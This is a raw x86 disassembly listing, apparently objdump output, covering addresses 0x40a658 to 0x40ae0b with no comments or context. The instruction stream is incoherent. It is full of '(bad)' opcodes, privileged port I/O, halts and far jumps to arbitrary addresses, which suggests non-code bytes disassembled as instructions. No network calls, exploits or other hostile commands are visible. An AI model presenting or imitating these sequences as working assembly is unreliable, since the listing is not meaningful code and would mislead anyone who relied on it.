  40a658:	ins    DWORD PTR es:[edi],dx
  40a659:	daa    
  40a65a:	mov    edx,esi
  40a65c:	push   ebx
  40a65d:	arpl   WORD PTR [eax+0x2be4b9af],dx
  40a663:	xor    BYTE PTR [edi],ah
  40a665:	dec    ecx
  40a666:	push   ecx
  40a667:	push   ss
  40a668:	inc    esi
  40a669:	xchg   esi,eax
  40a66a:	xor    al,bh
  40a66c:	or     al,0xa2
  40a66e:	outs   dx,DWORD PTR ds:[esi]
  40a66f:	mov    bl,0x7f
  40a671:	fimul  DWORD PTR [ebx]
  40a673:	loop   0x40a66a
  40a675:	ins    BYTE PTR es:[edi],dx
  40a676:	jo     0x40a6f1
  40a678:	(bad)  
  40a679:	xchg   ebx,eax
  40a67a:	int    0x5f
  40a67c:	cmp    eax,0xd2e7fd51
  40a681:	dec    esi
  40a682:	ins    BYTE PTR es:[edi],dx
  40a683:	sub    BYTE PTR [edi-0x692efa1e],0x86
  40a68a:	addr16 dec ebp
  40a68c:	xchg   edi,eax
  40a68d:	mov    eax,ds:0x9a73e85f
  40a692:	clc    
  40a693:	fs es jmp 0xbb38095c
  40a69a:	jbe    0x40a6b7
  40a69c:	jnp    0x40a65b
  40a69e:	lock shl DWORD PTR [esi-0x7c],1
  40a6a2:	xchg   esp,eax
  40a6a3:	xor    dl,BYTE PTR [edx+0x79b830cd]
  40a6a9:	inc    DWORD PTR ss:[edx]
  40a6ac:	ficom  WORD PTR [eax-0x4d]
  40a6af:	retf   0x601f
  40a6b2:	mov    BYTE PTR [ebx+0x4f657be6],dl
  40a6b8:	std    
  40a6b9:	sbb    edi,DWORD PTR [esp+ebx*2+0x387c42d2]
  40a6c0:	cmc    
  40a6c1:	test   DWORD PTR [ebx],0x88b931dc
  40a6c7:	xor    DWORD PTR [esi-0x22],esi
  40a6ca:	sub    BYTE PTR [eax+ebx*8],ah
  40a6cd:	jno    0x40a741
  40a6cf:	sbb    dl,BYTE PTR [esi+ebp*8]
  40a6d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6d3:	push   0xffffffcd
  40a6d5:	test   eax,0xd733caa1
  40a6da:	shr    BYTE PTR [ebp+0x17f58bec],cl
  40a6e0:	mov    dl,0x32
  40a6e2:	test   DWORD PTR [edi],0xa78537fe
  40a6e8:	push   edi
  40a6e9:	and    ebx,ecx
  40a6eb:	push   ss
  40a6ec:	or     edi,edi
  40a6ee:	and    al,0xed
  40a6f0:	mov    edx,0x45b0a9d3
  40a6f5:	and    ah,BYTE PTR [edx+0x2]
  40a6f8:	adc    BYTE PTR [edi],ch
  40a6fa:	mov    ebp,0x3898f03f
  40a6ff:	hlt    
  40a700:	rcl    BYTE PTR cs:[esi-0x1c],0xf9
  40a705:	inc    edx
  40a706:	arpl   WORD PTR [ecx],cx
  40a708:	scas   eax,DWORD PTR es:[edi]
  40a709:	fld    DWORD PTR [esi]
  40a70b:	sub    eax,0x5b5a59d6
  40a710:	sahf   
  40a711:	leave  
  40a712:	in     eax,0xe2
  40a714:	adc    DWORD PTR [eax+0x74],ebp
  40a717:	addr16 icebp 
  40a719:	pop    edi
  40a71a:	stos   DWORD PTR es:[edi],eax
  40a71b:	add    BYTE PTR [eax+0x2cd0892],ch
  40a721:	fisubr DWORD PTR [ebx]
  40a723:	(bad)  
  40a725:	adc    bl,dl
  40a727:	push   ebp
  40a728:	popa   
  40a729:	jecxz  0x40a75e
  40a72b:	sbb    dx,0xac8e
  40a730:	push   cs
  40a731:	shl    BYTE PTR [ebx],0x11
  40a734:	outs   dx,DWORD PTR ds:[esi]
  40a735:	leave  
  40a736:	sti    
  40a737:	mov    ah,0x75
  40a739:	push   ebp
  40a73a:	sbb    DWORD PTR [esi+0x2a1fcde9],eax
  40a740:	or     BYTE PTR [eax-0x12b70580],bh
  40a746:	push   ebx
  40a747:	fsubr  DWORD PTR [ebx+ebx*1-0x7bb9be00]
  40a74e:	pop    ss
  40a74f:	or     al,0x15
  40a751:	dec    eax
  40a752:	add    ecx,eax
  40a754:	xor    ah,BYTE PTR [edx+0x67]
  40a757:	mov    bh,BYTE PTR [ecx+0x39bc2da6]
  40a75d:	adc    ah,BYTE PTR [ebx]
  40a75f:	(bad)  
  40a760:	pop    eax
  40a761:	sbb    al,0x54
  40a763:	fcmovb st,st(5)
  40a765:	stos   DWORD PTR es:[edi],eax
  40a766:	dec    edx
  40a767:	xchg   edi,eax
  40a768:	sahf   
  40a769:	mov    bh,BYTE PTR [edi-0x62f114b4]
  40a76f:	punpcklbw mm3,DWORD PTR [edi-0x5a]
  40a773:	inc    ebp
  40a774:	ror    BYTE PTR [ebx-0x4d],0x38
  40a778:	inc    eax
  40a779:	lods   al,BYTE PTR ds:[esi]
  40a77a:	sub    bh,0x40
  40a77d:	mov    al,0x59
  40a77f:	test   al,0x37
  40a781:	xchg   ecx,eax
  40a782:	push   edi
  40a783:	les    ebp,FWORD PTR [edi+0x5c]
  40a786:	jae    0x40a7ba
  40a788:	dec    esp
  40a789:	and    eax,0x84efcfa9
  40a78e:	fsin   
  40a790:	(bad)
  40a794:	fcomp  QWORD PTR [ebp+0x3959367b]
  40a79a:	push   esp
  40a79b:	cwde   
  40a79c:	jg     0x40a7a2
  40a79e:	fidivr DWORD PTR [esi+0x65]
  40a7a1:	lahf   
  40a7a2:	pushf  
  40a7a3:	neg    BYTE PTR [edi+0x18aa3471]
  40a7a9:	sub    BYTE PTR [ebp+0x514b0824],al
  40a7af:	xchg   DWORD PTR [esp+eax*1+0xd],edi
  40a7b3:	inc    ebx
  40a7b4:	cmp    al,0x8e
  40a7b6:	das    
  40a7b7:	add    BYTE PTR [edx],ah
  40a7b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7ba:	outs   dx,BYTE PTR ds:[esi]
  40a7bb:	int    0xc0
  40a7bd:	in     al,dx
  40a7be:	dec    edx
  40a7bf:	(bad)  
  40a7c1:	loope  0x40a77d
  40a7c3:	dec    esi
  40a7c4:	push   edx
  40a7c5:	sti    
  40a7c6:	xor    al,0xe
  40a7c8:	imul   esp,edx,0x75
  40a7cb:	aaa    
  40a7cc:	adc    eax,0x9e681df5
  40a7d1:	sbb    bh,BYTE PTR [edx-0x5f]
  40a7d4:	inc    esi
  40a7d5:	(bad)  
  40a7d6:	outs   dx,DWORD PTR ds:[esi]
  40a7d7:	jmp    0xb845:0x4dfd1fbc
  40a7de:	scas   al,BYTE PTR es:[edi]
  40a7df:	xchg   edx,eax
  40a7e0:	add    eax,0x4516a67e
  40a7e5:	clc    
  40a7e6:	xchg   edi,eax
  40a7e7:	inc    eax
  40a7e8:	xchg   edi,eax
  40a7e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a7ea:	push   edx
  40a7eb:	xlat   BYTE PTR ds:[ebx]
  40a7ec:	out    dx,al
  40a7ed:	dec    ebp
  40a7ee:	rcl    DWORD PTR [eax+0xb],0x52
  40a7f2:	adc    eax,0xd15939dd
  40a7f7:	dec    ebp
  40a7f8:	js     0x40a7ab
  40a7fa:	outs   dx,DWORD PTR ds:[esi]
  40a7fb:	xor    eax,0x798cd003
  40a800:	test   DWORD PTR [edi-0x10e7fb43],ebp
  40a806:	xchg   ebp,eax
  40a807:	icebp  
  40a808:	add    esp,edi
  40a80a:	(bad)  
  40a80b:	dec    esi
  40a80c:	adc    BYTE PTR [ebx],ch
  40a80e:	add    edi,DWORD PTR [ebx-0x12]
  40a811:	sub    ebp,DWORD PTR [esi+0x5fe9cec2]
  40a817:	jg     0x40a81c
  40a819:	mov    BYTE PTR [ebp+0x48],bl
  40a81c:	cmp    al,0x6b
  40a81e:	add    dh,bh
  40a820:	push   0x8c0e6752
  40a825:	or     al,0x91
  40a827:	and    BYTE PTR [ecx+esi*2-0x19],dh
  40a82b:	(bad)  
  40a82c:	jne    0x40a881
  40a82e:	mov    ebp,0xb7e175c6
  40a833:	pop    ebx
  40a834:	and    ah,BYTE PTR [esi+0x64]
  40a837:	push   esp
  40a838:	inc    ebx
  40a839:	and    eax,0xfc8c119f
  40a83e:	(bad)  
  40a83f:	xchg   esi,eax
  40a840:	jb     0x40a7c3
  40a842:	inc    esp
  40a843:	repz or eax,0xcb055f52
  40a849:	cld    
  40a84a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a84b:	imul   ebp,ebp,0x5882c293
  40a851:	push   0xeb0319b9
  40a856:	in     al,0xc7
  40a858:	jl     0x40a866
  40a85a:	lds    edi,FWORD PTR [ebx]
  40a85c:	jb     0x40a853
  40a85e:	ja     0x40a8c9
  40a860:	div    DWORD PTR [eax]
  40a862:	sbb    al,0xbc
  40a864:	mov    ecx,0xc240a408
  40a869:	jnp    0x40a840
  40a86b:	into   
  40a86c:	imul   esi,DWORD PTR [esi],0x4b
  40a86f:	repz mov ds:0xf933e976,al
  40a875:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a876:	xchg   esi,eax
  40a877:	mov    bl,0x99
  40a879:	jmp    0x40a8b4
  40a87b:	sub    al,cl
  40a87d:	cmc    
  40a87e:	sub    bl,BYTE PTR [eax-0x63e9c189]
  40a884:	ins    DWORD PTR es:[edi],dx
  40a885:	push   es
  40a886:	stc    
  40a887:	(bad)
  40a88c:	pop    eax
  40a88d:	mov    ds:0x913bb20f,al
  40a892:	pusha  
  40a893:	dec    ecx
  40a894:	ss sti 
  40a896:	sti    
  40a897:	data16 jge 0x40a8f5
  40a89a:	fisubr DWORD PTR [edi]
  40a89c:	cdq    
  40a89d:	or     al,0xd4
  40a89f:	xor    dh,cl
  40a8a1:	stos   DWORD PTR es:[edi],eax
  40a8a2:	jno    0x40a8b6
  40a8a4:	push   0x9ac7e5ae
  40a8a9:	jnp    0x40a892
  40a8ab:	fdiv   DWORD PTR [edi+ebp*8]
  40a8ae:	mov    bl,0xc3
  40a8b0:	sub    BYTE PTR [ebp-0x1d2d48ac],dh
  40a8b6:	ins    DWORD PTR es:[edi],dx
  40a8b7:	mov    al,ds:0x9cb72a5d
  40a8bc:	sub    al,0x91
  40a8be:	fsubr  QWORD PTR [edx-0x50]
  40a8c1:	jne    0x40a91b
  40a8c3:	push   edi
  40a8c4:	adc    BYTE PTR [eax],0xad
  40a8c7:	mov    esp,0xeb0d084e
  40a8cc:	jns    0x40a8d0
  40a8ce:	xchg   ebp,eax
  40a8cf:	pop    ss
  40a8d0:	mov    edi,0xb4374eae
  40a8d5:	leave  
  40a8d6:	fisub  WORD PTR [ebp+0x448dbff1]
  40a8dc:	mov    dl,0x38
  40a8de:	enter  0x9506,0xc6
  40a8e2:	(bad)  
  40a8e3:	out    0x7e,eax
  40a8e5:	pop    ebp
  40a8e6:	adc    DWORD PTR [esi*1-0x4643013e],0x851aae64
  40a8f1:	leave  
  40a8f2:	jmp    0xf908d104
  40a8f7:	adc    eax,0xd427e820
  40a8fc:	mov    esi,0x198f3cd5
  40a901:	int    0x4e
  40a903:	setle  BYTE PTR [esp+esi*2-0x9591222]
  40a90b:	xlat   BYTE PTR ds:[ebx]
  40a90c:	in     al,dx
  40a90d:	inc    ebx
  40a90e:	outs   dx,BYTE PTR ds:[esi]
  40a90f:	int3   
  40a910:	adc    bh,BYTE PTR [ebp+0x2165137]
  40a916:	xlat   BYTE PTR ds:[ebx]
  40a917:	push   ds
  40a918:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a919:	or     al,BYTE PTR [ecx-0x3090386]
  40a91f:	mov    bh,0x8d
  40a921:	daa    
  40a922:	add    bl,0x2e
  40a925:	jb     0x40a97f
  40a927:	clc    
  40a928:	dec    edx
  40a929:	out    dx,eax
  40a92a:	jno    0x40a8cd
  40a92c:	cld    
  40a92d:	cld    
  40a92e:	inc    edx
  40a92f:	pop    eax
  40a930:	test   al,0x10
  40a932:	add    eax,0xff22f72a
  40a937:	push   ss
  40a938:	cmp    BYTE PTR [eax-0x79e5954],ah
  40a93e:	jg     0x40a9b0
  40a940:	and    al,BYTE PTR cs:[edx-0x6e]
  40a944:	jmp    0xcc006e74
  40a949:	xor    BYTE PTR [esi+0x20bb9d25],ch
  40a94f:	in     al,dx
  40a950:	sbb    edi,DWORD PTR [edi]
  40a952:	adc    DWORD PTR [edx],ebx
  40a954:	add    ebp,edx
  40a956:	push   esp
  40a957:	pusha  
  40a958:	dec    esp
  40a959:	(bad)  
  40a95a:	push   eax
  40a95b:	stos   DWORD PTR es:[edi],eax
  40a95c:	mov    edi,ds
  40a95e:	sub    dl,BYTE PTR [ebx-0x7e]
  40a961:	shl    al,0x4c
  40a964:	jbe    0x40a902
  40a966:	lods   al,BYTE PTR ds:[esi]
  40a967:	das    
  40a968:	out    0x7,al
  40a96a:	call   0x2a9a:0xa638a14f
  40a971:	xchg   edi,eax
  40a972:	popf   
  40a973:	sbb    eax,0x189bb573
  40a978:	xor    edx,eax
  40a97a:	rcr    DWORD PTR [ecx+esi*1+0x15],1
  40a97e:	sub    bl,bl
  40a980:	imul   edi,ebx,0x62708892
  40a986:	sbb    eax,0xa7499268
  40a98b:	cmp    al,0x6
  40a98d:	pop    ebx
  40a98e:	push   eax
  40a98f:	in     eax,dx
  40a990:	fcom   st(7)
  40a992:	dec    edx
  40a993:	shrd   edi,ebx,cl
  40a996:	pushf  
  40a997:	mov    bl,0x26
  40a999:	pop    esi
  40a99a:	inc    edx
  40a99b:	loop   0x40a929
  40a99d:	fs dec ecx
  40a99f:	mov    ebp,0xb2a75946
  40a9a4:	add    BYTE PTR [ecx+eax*2],0x5e
  40a9a8:	loop   0x40aa14
  40a9aa:	jle    0x40a950
  40a9ac:	ds xchg esp,eax
  40a9ae:	jle    0x40a9c4
  40a9b0:	stos   BYTE PTR es:[edi],al
  40a9b1:	test   al,0xf6
  40a9b3:	(bad)  
  40a9b4:	pop    ds
  40a9b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9b6:	adc    eax,0x6673ee77
  40a9bb:	jecxz  0x40a9dd
  40a9bd:	pop    ecx
  40a9be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9bf:	nop    ecx
  40a9c2:	push   esp
  40a9c3:	ss pop ecx
  40a9c5:	xor    dh,BYTE PTR [edx]
  40a9c7:	sub    dl,cl
  40a9c9:	and    eax,DWORD PTR [eax]
  40a9cb:	push   edx
  40a9cc:	inc    edx
  40a9cd:	xchg   edx,eax
  40a9ce:	(bad)  
  40a9cf:	hlt    
  40a9d0:	sti    
  40a9d1:	xchg   esp,esp
  40a9d3:	push   ds
  40a9d4:	dec    ebx
  40a9d5:	cmp    cl,BYTE PTR [ebx]
  40a9d7:	lahf   
  40a9d8:	enter  0x586,0x8b
  40a9dc:	mov    ebp,0xfc6d9479
  40a9e1:	gs in  eax,0x21
  40a9e4:	or     BYTE PTR [ecx-0xf],dh
  40a9e7:	mov    ah,0x33
  40a9e9:	clc    
  40a9ea:	jle    0x40a97e
  40a9ec:	ja     0x40a99e
  40a9ee:	scas   eax,DWORD PTR es:[edi]
  40a9ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9f0:	xor    DWORD PTR [edi],eax
  40a9f2:	inc    edx
  40a9f3:	ins    DWORD PTR es:[edi],dx
  40a9f4:	retf   0x928e
  40a9f7:	out    0xdf,al
  40a9f9:	(bad)  
  40a9fb:	fst    QWORD PTR [ebx+0x528df443]
  40aa01:	aam    0x76
  40aa03:	cmc    
  40aa04:	xor    DWORD PTR [edx],ebx
  40aa06:	xor    DWORD PTR [ecx-0x809d7ff],0xabfb5827
  40aa10:	mov    ebp,0xcc498cfc
  40aa15:	idiv   al
  40aa17:	in     eax,0x1
  40aa19:	mov    bl,0x8
  40aa1b:	loope  0x40a9e5
  40aa1d:	mov    bl,0x1c
  40aa1f:	nop
  40aa20:	dec    eax
  40aa21:	jmp    0xdf66:0x42a5d1bc
  40aa28:	cwde   
  40aa29:	(bad)  
  40aa2a:	xor    DWORD PTR [eax-0x5],ecx
  40aa2d:	stos   BYTE PTR es:[edi],al
  40aa2e:	mov    ds:0xba340631,eax
  40aa33:	jmp    0x4ebd:0x4ca9e041
  40aa3a:	sub    al,0xfc
  40aa3c:	retf   0x26dc
  40aa3f:	mov    dl,0xc5
  40aa41:	arpl   WORD PTR [edx+0x52ac23c3],bx
  40aa47:	inc    ebx
  40aa48:	mov    ch,dl
  40aa4a:	xchg   esp,eax
  40aa4b:	or     al,0xbc
  40aa4d:	out    dx,al
  40aa4e:	mov    bl,0x78
  40aa50:	adc    al,0x30
  40aa52:	loopne 0x40aa30
  40aa54:	push   ebx
  40aa55:	inc    eax
  40aa56:	and    BYTE PTR [esp+eiz*4-0x21d4961b],cl
  40aa5d:	js     0x40aa2c
  40aa5f:	sti    
  40aa60:	adc    DWORD PTR [eax*1-0x7479038c],esi
  40aa67:	scas   al,BYTE PTR es:[edi]
  40aa68:	daa    
  40aa69:	fcomip st,st(4)
  40aa6b:	pop    ebx
  40aa6c:	xchg   edx,eax
  40aa6d:	adc    DWORD PTR [ebp-0x6b],esp
  40aa70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa71:	ins    DWORD PTR es:[edi],dx
  40aa72:	or     edi,edx
  40aa74:	popa   
  40aa75:	jbe    0x40aab4
  40aa77:	dec    esi
  40aa78:	inc    ebp
  40aa79:	add    DWORD PTR [ebx-0x3cb3a268],ecx
  40aa7f:	stos   DWORD PTR es:[edi],eax
  40aa80:	es mov edi,0xfc8de9ab
  40aa86:	inc    edx
  40aa87:	cld    
  40aa88:	mov    edx,DWORD PTR [edi-0x46]
  40aa8b:	ret    0xa3b6
  40aa8e:	mov    WORD PTR [eax-0x4465ed16],fs
  40aa94:	pop    ecx
  40aa95:	mov    bh,0x6d
  40aa97:	in     eax,dx
  40aa98:	cmp    eax,0x51a9b42f
  40aa9d:	pop    edi
  40aa9e:	test   al,0xbe
  40aaa0:	push   edx
  40aaa1:	mov    eax,0x53bf7cdb
  40aaa6:	fimul  WORD PTR [esi+0x30]
  40aaa9:	nop
  40aaaa:	or     DWORD PTR [ebp-0x50],0x4f71c7c6
  40aab1:	popa   
  40aab2:	(bad)  
  40aab4:	pop    edx
  40aab5:	test   eax,0x9f3b8f61
  40aaba:	sbb    al,0x13
  40aabc:	mov    esi,0xb12af627
  40aac1:	mov    edx,0xd0c3375
  40aac6:	jno    0x40aa4a
  40aac8:	and    bl,bh
  40aaca:	jge    0x40aadf
  40aacc:	bound  edi,QWORD PTR [ebx]
  40aace:	outs   dx,DWORD PTR ds:[esi]
  40aacf:	cmp    al,0x3d
  40aad1:	mov    bl,0x4e
  40aad3:	aaa    
  40aad4:	stc    
  40aad5:	push   ecx
  40aad6:	(bad)  
  40aad7:	fldenv [edx]
  40aad9:	inc    bh
  40aadb:	jo     0x40aac4
  40aadd:	pop    ss
  40aade:	inc    ebp
  40aadf:	mov    ds:0x424e3954,al
  40aae4:	jns    0x40aaf7
  40aae6:	ja     0x40aa90
  40aae8:	mov    esp,0x725ec6f4
  40aaed:	or     BYTE PTR [ecx+0x6988b8b],ch
  40aaf3:	mov    bh,0xde
  40aaf5:	das    
  40aaf6:	out    dx,al
  40aaf7:	cmp    edx,DWORD PTR [edx-0x9]
  40aafa:	jmp    0x53c15a2b
  40aaff:	pop    ds
  40ab00:	cmp    DWORD PTR [ebx],edi
  40ab02:	das    
  40ab03:	pop    ebx
  40ab04:	repz push esi
  40ab06:	xor    BYTE PTR [ecx+0x727f54b2],bh
  40ab0c:	adc    dh,BYTE PTR ds:0x2f57bba5
  40ab12:	push   esi
  40ab13:	push   0x3485aef
  40ab18:	sbb    DWORD PTR [eax+0x48f387b8],0xffffff92
  40ab1f:	inc    edi
  40ab20:	pop    ds
  40ab21:	push   ebx
  40ab22:	out    dx,al
  40ab23:	jmp    0xdf17:0x337e62d4
  40ab2a:	inc    edx
  40ab2b:	ffreep st(0)
  40ab2d:	push   ebx
  40ab2e:	ja     0x40aae8
  40ab30:	mov    ebp,DWORD PTR [ebx-0x18]
  40ab33:	pop    edi
  40ab34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab35:	dec    ebx
  40ab36:	and    edi,DWORD PTR [ecx]
  40ab38:	push   edi
  40ab39:	fcmovne st,st(0)
  40ab3b:	int3   
  40ab3c:	dec    edx
  40ab3d:	scas   eax,DWORD PTR es:[edi]
  40ab3e:	repz mov cl,0xe8
  40ab41:	loope  0x40ab4b
  40ab43:	or     BYTE PTR [eax],0x64
  40ab46:	retf   0x64d1
  40ab49:	arpl   WORD PTR [ecx],si
  40ab4b:	aas    
  40ab4c:	dec    edi
  40ab4d:	mov    al,0x82
  40ab4f:	call   0x902eaf4f
  40ab54:	pop    ecx
  40ab55:	in     al,0x86
  40ab57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab58:	lods   eax,DWORD PTR ds:[esi]
  40ab59:	repz push ss
  40ab5b:	jb     0x40ab6d
  40ab5d:	pop    esp
  40ab5e:	cmc    
  40ab5f:	inc    ebp
  40ab60:	ja     0x40abb9
  40ab62:	dec    esi
  40ab63:	pop    es
  40ab64:	jns    0x40abb6
  40ab66:	sub    DWORD PTR [edx-0x643e8b33],0xffffffce
  40ab6d:	or     BYTE PTR [esi+0x31],bl
  40ab70:	fwait
  40ab71:	xor    edx,DWORD PTR [edi+esi*4-0x77]
  40ab75:	ins    DWORD PTR es:[edi],dx
  40ab76:	sub    eax,0xcb38b482
  40ab7b:	xor    cl,BYTE PTR [ebp+0x7917d27a]
  40ab81:	daa    
  40ab82:	mov    edx,0xfa6888f9
  40ab87:	adc    al,0xfb
  40ab89:	or     eax,0x8aec5607
  40ab8e:	push   es
  40ab8f:	push   edi
  40ab90:	jmp    DWORD PTR [edi-0x17e76eda]
  40ab96:	cmp    eax,0x7fafec8b
  40ab9b:	out    0xf9,eax
  40ab9d:	or     eax,0x84e0d169
  40aba2:	nop
  40aba3:	sahf   
  40aba4:	dec    ecx
  40aba5:	fucomip st,st(2)
  40aba7:	lea    esp,[edx-0x29b682ff]
  40abad:	push   cs
  40abae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40abaf:	push   ebx
  40abb0:	test   BYTE PTR [edi],cl
  40abb2:	(bad)  
  40abb3:	cli    
  40abb4:	xor    al,0xe9
  40abb6:	in     al,dx
  40abb7:	mov    dh,0x63
  40abb9:	push   ecx
  40abba:	je     0x40ac19
  40abbc:	and    al,0x3f
  40abbe:	sub    DWORD PTR [ebp-0x8],esi
  40abc1:	bound  edx,QWORD PTR [edi+0x5fa84ea2]
  40abc7:	or     BYTE PTR [ebx+0x16f55d49],cl
  40abcd:	push   ecx
  40abce:	push   ecx
  40abcf:	loop   0x40ab65
  40abd1:	push   0x93556d44
  40abd6:	jae    0x40ab8e
  40abd8:	inc    ecx
  40abd9:	ja     0x40abae
  40abdb:	test   eax,0x8b636433
  40abe0:	loope  0x40abfb
  40abe2:	(bad)  
  40abe3:	imul   ebp,DWORD PTR [eax+ecx*2],0x7570078e
  40abea:	jmp    0xd1dbe8c4
  40abef:	call   0xf43c:0x21c4fa97
  40abf6:	sahf   
  40abf7:	in     eax,dx
  40abf8:	ds cld 
  40abfa:	and    al,0xb5
  40abfc:	push   es
  40abfd:	sub    ebx,DWORD PTR [edi+ebp*8+0x78]
  40ac01:	stos   DWORD PTR es:[edi],eax
  40ac02:	mov    cl,0xe0
  40ac04:	(bad)  
  40ac05:	push   0x6e6a0c2d
  40ac0a:	or     DWORD PTR [ecx],edi
  40ac0c:	pop    es
  40ac0d:	popf   
  40ac0e:	push   edi
  40ac0f:	popa   
  40ac10:	and    ah,0xd
  40ac13:	inc    ebx
  40ac14:	jmp    0xed230832
  40ac19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac1a:	rcl    BYTE PTR [edi-0x4a],1
  40ac1d:	mov    al,ds:0x1b54d9c7
  40ac22:	adc    DWORD PTR [ebx-0x75db0ad],ebx
  40ac28:	sbb    BYTE PTR [edx+ebx*2+0x58],dl
  40ac2c:	adc    ebp,DWORD PTR [ebp-0x7d]
  40ac2f:	call   0xee06801b
  40ac34:	and    al,0xcf
  40ac36:	jle    0x40aca3
  40ac38:	and    eax,0xd44baa1
  40ac3d:	jns    0x40ac70
  40ac3f:	js     0x40ac65
  40ac41:	jb     0x40ac16
  40ac43:	popa   
  40ac44:	jecxz  0x40abfc
  40ac46:	fisub  DWORD PTR [edx-0x7a]
  40ac49:	(bad)  
  40ac4a:	das    
  40ac4b:	xchg   DWORD PTR [edi],ebx
  40ac4d:	push   esp
  40ac4e:	sahf   
  40ac4f:	call   0x957859af
  40ac54:	ins    DWORD PTR es:[edi],dx
  40ac55:	and    al,0xd
  40ac57:	imul   ebp,DWORD PTR [edi+0x3d],0xd672a48a
  40ac5e:	sar    cl,cl
  40ac60:	pop    ebx
  40ac61:	addr16 test eax,0xfda330dd
  40ac67:	sbb    ebp,DWORD PTR [edx+0x4d]
  40ac6a:	aaa    
  40ac6b:	mov    ecx,edi
  40ac6d:	and    DWORD PTR [esi+0x77],esi
  40ac70:	enter  0x4519,0xf9
  40ac74:	or     DWORD PTR [edx-0x38],esi
  40ac77:	dec    esp
  40ac78:	test   bl,bl
  40ac7a:	lahf   
  40ac7b:	mov    eax,ebp
  40ac7d:	mov    ch,0x8f
  40ac7f:	pop    esi
  40ac80:	jge    0x40acaf
  40ac82:	mov    bh,0x88
  40ac84:	inc    edi
  40ac85:	mov    al,ds:0x73077ede
  40ac8a:	inc    ebx
  40ac8b:	arpl   WORD PTR [ebx+ecx*2-0x23],sp
  40ac8f:	mov    BYTE PTR [ebp+0x41],ah
  40ac92:	and    al,0x1c
  40ac94:	test   DWORD PTR [esi-0x6c],esp
	...
  40ad13:	add    BYTE PTR [ebx-0x2370a3bd],al
  40ad19:	lahf   
  40ad1a:	ror    DWORD PTR [edi-0x18],cl
  40ad1d:	pushw  0x34
  40ad20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad21:	xor    ax,WORD PTR [esi+edi*4+0x5e]
  40ad26:	add    BYTE PTR [eax],al
  40ad28:	imul   eax,DWORD PTR [edi],0x0
  40ad2b:	add    BYTE PTR [edi+0x46e3f217],cl
  40ad31:	mov    bh,0x39
  40ad33:	scas   eax,DWORD PTR es:[edi]
  40ad34:	cmp    ecx,DWORD PTR [eax+0x5a]
  40ad37:	rcl    DWORD PTR ds:0xc96c2237,1
  40ad3d:	push   ebp
  40ad3e:	jge    0x40ad1d
  40ad40:	xchg   ebx,eax
  40ad41:	jae    0x40ad47
  40ad43:	jp     0x40ad0a
  40ad45:	cmc    
  40ad46:	jmp    0x40adb7
  40ad48:	rol    DWORD PTR [eax-0x7e],cl
  40ad4b:	jmp    0x91feb2f4
  40ad50:	lea    esp,[eax]
  40ad52:	inc    esp
  40ad53:	sub    edx,ecx
  40ad55:	stc    
  40ad56:	ins    DWORD PTR es:[edi],dx
  40ad57:	mov    esi,0x782bef88
  40ad5c:	shl    ch,cl
  40ad5e:	sub    DWORD PTR [esi-0x5d615886],esi
  40ad64:	adc    esi,ebx
  40ad66:	sbb    dl,ah
  40ad68:	jno    0x40adde
  40ad6a:	inc    ebx
  40ad6b:	cli    
  40ad6c:	addr16 fld st(4)
  40ad6f:	xchg   DWORD PTR [esi+0x45],esp
  40ad72:	push   edx
  40ad73:	push   ecx
  40ad74:	sub    ebp,DWORD PTR [eax+eiz*4-0x2d]
  40ad78:	cmp    ecx,ecx
  40ad7a:	mov    ds:0xfcd13aa1,al
  40ad7f:	imul   edi,esi,0x5324b2b5
  40ad85:	push   ebx
  40ad86:	add    bh,BYTE PTR [ebx-0xa8b069e]
  40ad8c:	sbb    BYTE PTR [eax+0x4b],ch
  40ad8f:	scas   al,BYTE PTR es:[edi]
  40ad90:	or     BYTE PTR [ebx],ah
  40ad92:	lods   al,BYTE PTR ds:[esi]
  40ad93:	pop    esi
  40ad94:	dec    eax
  40ad95:	gs mov ebp,0x2e49e00f
  40ad9b:	sbb    ebx,DWORD PTR [ecx+edi*1-0x3b60d81e]
  40ada2:	sub    BYTE PTR [ebp-0x43bcf7bc],dh
  40ada8:	scas   al,BYTE PTR es:[edi]
  40ada9:	sub    esp,ebp
  40adab:	push   0xb5ce47b9
  40adb0:	xchg   esp,eax
  40adb1:	enter  0x5b09,0x4c
  40adb5:	mov    BYTE PTR [edx],al
  40adb7:	sub    dh,BYTE PTR [edx-0x3bf2310c]
  40adbd:	enter  0x2c0d,0xf7
  40adc1:	and    esi,DWORD PTR [ebp+0x66]
  40adc4:	gs jbe 0x40ad5c
  40adc7:	ror    BYTE PTR [edi-0x5d70ac1a],cl
  40adcd:	inc    esi
  40adce:	jmp    0x40adde
  40add0:	jmp    0x7b20f1f0
  40add5:	stos   DWORD PTR es:[edi],eax
  40add6:	or     al,0x6b
  40add8:	mov    cl,0xfb
  40adda:	mov    ds:0xa8959153,eax
  40addf:	cwde   
  40ade0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ade1:	xchg   DWORD PTR [ebx],ebp
  40ade3:	push   es
  40ade4:	jp     0x40ade3
  40ade6:	push   edi
  40ade7:	or     bh,BYTE PTR [ebp+0x3f]
  40adea:	mov    eax,0x560aaac4
  40adef:	in     eax,0x7f
  40adf1:	test   BYTE PTR [eax],cl
  40adf3:	dec    esp
  40adf4:	stc    
  40adf5:	xor    BYTE PTR [eax+0x4c],ch
  40adf8:	pop    esp
  40adf9:	mov    esi,0x8c27eedf
  40adfe:	pop    ecx
  40adff:	ror    BYTE PTR [esi+ecx*4+0x2442112d],cl
  40ae06:	or     al,BYTE PTR [ebp+0x0]
  40ae09:	fmul   DWORD PTR [ebx]
  40ae0b:	xchg   edx,eax
